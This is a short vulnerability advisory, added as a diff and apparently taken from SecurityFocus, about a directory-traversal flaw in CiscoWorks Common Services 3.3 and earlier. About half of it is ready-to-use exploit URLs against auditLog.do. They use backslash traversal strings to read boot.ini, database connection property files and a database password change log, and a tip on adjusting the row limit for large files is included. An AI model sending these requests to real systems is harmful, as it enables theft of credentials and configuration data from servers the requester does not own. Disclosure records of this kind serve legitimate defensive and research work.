@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/47905/info
+
+CiscoWorks Common Services is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+A remote attacker could exploit this vulnerability using directory-traversal strings (such as '../') to gain access to arbitrary files on the targeted system. This may result in the disclosure of sensitive information or lead to a complete compromise of the affected computer.
+
+This issue is being monitored by Cisco Bug ID CSCto35577.
+
+CiscoWorks Common Services 3.3 and prior are vulnerable.
+
+http://www.example.com/cwhp/auditLog.do?file=..\..\..\..\..\..\..\boot.ini
+cmfDBA user database info:
+
+http://www.example.com/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program
+Files\CSCOpx\MDC\Tomcat\webapps\triveni\WEB-INF\classes\schedule.properties DB connection info for all databases:
+
+http://www.example.com/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program
+Files\CSCOpx\lib\classpath\com\cisco\nm\cmf\dbservice2\DBServer.properties
+
+Note: When reading large files such as this file, ensure the row limit is adjusted to 500 for example.
+DB password change log:
+
+http://www.example.com/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program
+Files\CSCOpx\log\dbpwdChange.log
